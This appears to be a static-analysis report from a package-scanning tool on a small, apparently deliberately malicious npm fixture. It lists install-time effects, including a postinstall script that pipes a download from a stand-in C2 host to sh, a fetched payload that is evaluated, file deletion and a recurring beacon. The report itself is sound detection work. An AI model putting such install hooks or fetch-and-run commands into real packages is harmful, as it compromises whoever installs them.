# Forge analysis report

- Engine: `forge-analysis 0.0.1`
- Schema: 1
- Mode: static only (no code was run)
- Snapshot: `21640997110fe94a814caf659f927b541631e8a6969533c39f962f6461898070`
- Catalog: `3964b56eb1f291b361d5245379fe30f34f914abad7446a37f6ac4c56aa0c11e0`

<a id="index"></a>

## Index

1. [Overview](#overview) — What was analysed, whether the picture is complete, and one count for everything we could not see.
2. [Entry points](#entry-points) (3) — What runs first: runtime and install entry files, and declared entries that do not match any analysed file.
3. [Execution timeline](#execution-timeline) (7) — When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.
4. [Effects](#effects) (4) — What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.
5. [Data flows](#data-flows) (1) — Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.
6. [Install scripts and shell commands](#install-scripts-and-shell-commands) (2) — Every package.json script, when it runs, and the commands inside it that we could not follow.
7. [Dependencies](#dependencies) (4) — Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.
8. [Unresolved](#unresolved) (3) — Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.
9. [Unlinked imports](#unlinked-imports) (0) — Imports we could not follow to their source: packages, missing files and names that are not exported.
10. [Not analysed](#not-analysed) (3) — Files and folders that were not read as code, by kind, and anything skipped by a limit.
11. [Function index](#function-index) (7) — Every function with its lanes, effects, callers and the facts inside it.

<a id="overview"></a>

## 1. Overview

What was analysed, whether the picture is complete, and one count for everything we could not see.

**Status: incomplete.** Some of the code could not be seen. Each line below says how much, and links to the section that lists every item.

| What we could not see | Count | Listed in |
|---|---|---|
| places where static analysis cannot say what happens | 3 | [Unresolved](#unresolved) |
| imports not followed to their source | 0 | [Unlinked imports](#unlinked-imports) |
| declared entry points that match no analysed file | 0 | [Entry points](#entry-points) |
| files or folders not read as code | 3 | [Not analysed](#not-analysed) |
| dependencies whose own code and install scripts were not analysed | 3 | [Dependencies](#dependencies) |

- Files analysed: 3
- Files not analysed: 3
- Functions: 7
- Cross-file links made: 1
- Facts found: 22
- Facts by kind: 0 entry, 2 import, 5 call, 4 effect, 1 timer, 2 script, 4 dependency, 3 unresolved, 1 flow

[Back to the index](#index)

<a id="entry-points"></a>

## 2. Entry points

What runs first: runtime and install entry files, and declared entries that do not match any analysed file.

Entry points come from what the package declares (`main`, `bin`, `exports`, scripts).

### Runtime entry files (2)

- `lib.js`
- `test.js`

### Install entry files (1)

Run when the package is installed.

- `setup.js`

### Declared entries that match no analysed file (0)

None found.

[Back to the index](#index)

<a id="execution-timeline"></a>

## 3. Execution timeline

When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.

### Immediate (2)

Runs right away when the program starts.

- top level of `lib.js`
- top level of `test.js`

### Recurring (1)

Runs again and again (an interval).

- anonymous function in `setup.js:4`

### Install (3)

Runs when the package is installed, before anything else of it.

- top level of `setup.js`
- anonymous function in `setup.js:3`
- anonymous function in `setup.js:3`

### Timers (1)

- `setup.js:4` in top level of `setup.js` (runs: install): recurring, 5000 ms, never cleared, `setInterval`

[Back to the index](#index)

<a id="effects"></a>

## 4. Effects

What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.

### Runs code built at run time (1)

- `setup.js:3` in anonymous function in `setup.js:3` (runs: install)

### Deletes files (1)

- `setup.js:2` in top level of `setup.js` (runs: install): `/tmp/cache`

### Makes network requests (1)

- `setup.js:3` in top level of `setup.js` (runs: install): `https://c2.example/payload`

### Writes files (1)

- `setup.js:4` in anonymous function in `setup.js:4` (runs: recurring): `/tmp/beat`

[Back to the index](#index)

<a id="data-flows"></a>

## 5. Data flows

Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.

### Flows (1)

Each line: where the data is used, where it came from, and the expression it came from.

- `setup.js:3` in anonymous function in `setup.js:3` (runs: install) ← `setup.js:3`: `fetch('https://c2.example/payload')`

[Back to the index](#index)

<a id="install-scripts-and-shell-commands"></a>

## 6. Install scripts and shell commands

Every package.json script, when it runs, and the commands inside it that we could not follow.

### Scripts (2)

- `postinstall` (runs at install) at `package.json:6`: `node setup.js && curl -s https://c2.example/i.sh | sh`
  - not followed: `curl`
  - not followed: `sh`
- `test` (runs only when someone asks) at `package.json:7`: `node test.js`

[Back to the index](#index)

<a id="dependencies"></a>

## 7. Dependencies

Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.

### dependencies (3)

- `evil` `github:someone/evil`: git repository (at `package.json:11`)
- `left-pad` `^1.0.0`: package registry (at `package.json:10`)
- `local` `file:../local`: local path (at `package.json:12`)

### devDependencies (1)

- `tool` `1.2.3`: package registry (at `package.json:15`)

[Back to the index](#index)

<a id="unresolved"></a>

## 8. Unresolved

Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.

### Code built at run time (1)

Text is turned into code and run; what it does cannot be read from the source.

- `setup.js:3` in anonymous function in `setup.js:3` (runs: install): `t`

### Shell command not followed (2)

A command in a script that is not `node <file>` or `npm run <script>`, or one built at run time.

- `package.json:6`: `sh`
- `package.json:6`: `curl`

[Back to the index](#index)

<a id="unlinked-imports"></a>

## 9. Unlinked imports

Imports we could not follow to their source: packages, missing files and names that are not exported.

None found.

[Back to the index](#index)

<a id="not-analysed"></a>

## 10. Not analysed

Files and folders that were not read as code, by kind, and anything skipped by a limit.

### Package manager settings (1)

`.npmrc` and similar: can change where packages come from and run hooks.

- `.npmrc` (35 bytes)

### Shell and batch scripts (1)

Not read. They can run anything.

- `run.sh` (18 bytes)

### Other files (1)

Not code we analyse (documents, images, data, unknown types). Listed so nothing is hidden.

- `data.json` (9 bytes)

[Back to the index](#index)

<a id="function-index"></a>

## 11. Function index

Every function with its lanes, effects, callers and the facts inside it.

### `lib.js` (2)

- top level at line 1
  - runs: immediate
- anonymous at line 1
  - runs: none (not reached from an entry)

### `setup.js` (4)

- top level at line 1
  - runs: install
  - can reach: writes files, deletes files, makes network requests, runs code built at run time
  - calls not followed to a function in this file: 6
  - facts: `fact:c84dfdaf5bf34872`, `fact:056fe7f3c71e6b50`, `fact:7f00ed5b472bb992`, `fact:4cc140adbcc4fc13`, `fact:4f36fc35ef2f30d4`, `fact:8e90923ec4d7ab03`, `fact:38c761f4499498f8`
- anonymous at line 3
  - runs: install
  - calls not followed to a function in this file: 1
- anonymous at line 3
  - runs: install
  - can reach: runs code built at run time
  - unresolved inside: Code built at run time
  - calls not followed to a function in this file: 1
  - facts: `fact:4fb37decbb748c7f`, `fact:e66f2faa821ef4d1`, `fact:68df2048122e2fe3`, `fact:e9537ed6db62928e`
- anonymous at line 4
  - runs: recurring
  - can reach: writes files
  - calls not followed to a function in this file: 1
  - facts: `fact:0becde626b3a9a5a`, `fact:a548a44eef68e6a7`

### `test.js` (1)

- top level at line 1
  - runs: immediate
  - calls not followed to a function in this file: 1
  - facts: `fact:0032d2c40c930d98`

[Back to the index](#index)
